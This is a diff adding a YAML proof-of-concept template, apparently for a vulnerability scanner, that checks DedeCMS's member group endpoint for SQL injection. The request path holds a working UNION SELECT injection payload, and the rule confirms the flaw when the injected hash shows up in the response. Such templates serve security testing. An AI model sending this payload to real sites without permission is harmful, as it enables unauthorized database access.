@@ -1,0 +1,22 @@
+id: poc-yaml-dedecms-membergroup-sqli
+info:
+  name: Dedecms Membergroup SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: DedeCMS
+  reference: []
+  description: null
+variables:
+  r: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{.r}})+--+@`'`
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(r))
+  output: []
